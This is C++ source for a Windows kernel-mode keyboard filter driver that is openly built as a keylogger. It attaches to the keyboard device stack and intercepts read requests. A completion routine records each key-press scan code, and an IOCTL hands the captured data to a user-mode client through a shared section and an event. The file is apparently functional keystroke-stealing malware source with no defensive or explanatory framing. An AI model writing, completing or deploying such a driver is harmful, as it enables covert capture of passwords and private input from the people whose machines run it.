#include "Keylogger.hpp"


KeyloggerCore* logger;

_Use_decl_annotations_
NTSTATUS DriverEntry(
    [[maybe_unused]] PDRIVER_OBJECT DriverObject, 
    [[maybe_unused]] PUNICODE_STRING RegistryPath
)
{
    auto status = STATUS_SUCCESS;

    logger = new KeyloggerCore(DriverObject);

    status = logger->CreateDevice();
    if (!NT_SUCCESS(status))
        return status;

    status = logger->AddtachToDevice();
    if (!NT_SUCCESS(status))
        return status;

    status = logger->InitWorkItem();
    if (!NT_SUCCESS(status))
        return status;

    DriverObject->DriverUnload = KeyloggerUnload;

    for (auto& dispatcher : DriverObject->MajorFunction)
        dispatcher = KeyloggerDispatchPass;

    DriverObject->MajorFunction[IRP_MJ_CREATE] = KeyloggerDispatchCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = KeyloggerDispatchCreateClose;
    DriverObject->MajorFunction[IRP_MJ_READ] = KeyloggerDispatchRead;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = KeyloggerDispatchDeviceControl;
    return status;
}



_Use_decl_annotations_
NTSTATUS KeyloggerDispatchCreateClose([[maybe_unused]] PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IofCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}



_Use_decl_annotations_
NTSTATUS KeyloggerDispatchPass([[maybe_unused]] PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    IoSkipCurrentIrpStackLocation(Irp);
    return IofCallDriver(logger->getLowerDeviceObject(), Irp);
}



_Use_decl_annotations_
NTSTATUS KeyloggerDispatchRead(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    IoCopyCurrentIrpStackLocationToNext(Irp);

    auto status = IoSetCompletionRoutineEx(
        DeviceObject,
        Irp,
        ReadComplete,
        nullptr,
        TRUE, TRUE, TRUE
    );
    if (NT_SUCCESS(status))
    {
        ObReferenceObject(DeviceObject);
    }
    else
    {
        IoSkipCurrentIrpStackLocation(Irp);
    }

    return IofCallDriver(logger->getLowerDeviceObject(), Irp);
}



_Use_decl_annotations_
NTSTATUS KeyloggerDispatchDeviceControl([[maybe_unused]] PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    auto status = STATUS_SUCCESS;
    auto stack = IoGetCurrentIrpStackLocation(Irp);

    switch (stack->Parameters.DeviceIoControl.IoControlCode)
    {
    case IOCTL_DISTANCE_KEYLOGGER:
    {
        auto len = stack->Parameters.DeviceIoControl.InputBufferLength;
        auto buffer = Irp->AssociatedIrp.SystemBuffer;
        if (len < sizeof(HANDLE) || buffer == nullptr)
        {
            Irp->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;
            Irp->IoStatus.Information = len;
            break;
        }

        PVOID Event_ = nullptr;
        status = ObReferenceObjectByHandle(
            *static_cast<PHANDLE>(buffer),
            EVENT_MODIFY_STATE,
            *ExEventObjectType,
            Irp->RequestorMode, // User or Kernel space
            &Event_,
            nullptr
        );
        if (!NT_SUCCESS(status))
        {
            KdPrint(("ObReferenceObjectByHandle was failed: Status: 0x%ul\n", status));
            Irp->IoStatus.Status = status;
            Irp->IoStatus.Information = len;
            break;
        }

        logger->InitEvent(Event_);
        ObfDereferenceObject(Event_);

        status = logger->OpenSection();
        if (!NT_SUCCESS(status))
        {
            KdPrint(("OpenSection was failed: Status: 0x%ul\n", status));
            Irp->IoStatus.Status = status;
            Irp->IoStatus.Information = len;
            break;
        }

        Irp->IoStatus.Status = status;
        Irp->IoStatus.Information = len;
        break;
    }
    default:
        IoCopyCurrentIrpStackLocationToNext(Irp);
        return IofCallDriver(logger->getLowerDeviceObject(), Irp);
        break;
    }

    IofCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}



_Use_decl_annotations_
NTSTATUS ReadComplete(PDEVICE_OBJECT DeviceObject, PIRP Irp, [[maybe_unused]] PVOID context)
{
    ObfDereferenceObject(DeviceObject);
    auto keyboardInfo = static_cast<PKEYBOARD_INPUT_DATA>(Irp->AssociatedIrp.SystemBuffer);

    switch (keyboardInfo->Flags)
    {
    // Needs for skip 'KEY_BREAK'
    case (KEY_MAKE):
    case (KEY_MAKE | KEY_E0):
    case (KEY_MAKE | KEY_E1):
    case (KEY_MAKE | KEY_E0 | KEY_E1):
    {
        logger->saveKeyboardInfo(
            keyboardInfo
        );

        __try
        {
            logger->SetEvent();
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            KdPrint(("ReadComplete() exception: 0x%ul", GetExceptionCode()));
        }
        break;
    }
    default:
        break;
    }

    if (Irp->PendingReturned)
    {
        IoMarkIrpPending(Irp);
    }

    if (Irp->IoStatus.Status == STATUS_MORE_PROCESSING_REQUIRED)
        return STATUS_MORE_PROCESSING_REQUIRED;
    else
        return STATUS_CONTINUE_COMPLETION;
}



_Use_decl_annotations_
void KeyloggerUnload([[maybe_unused]] PDRIVER_OBJECT DriverObject)
{
    delete logger;
}
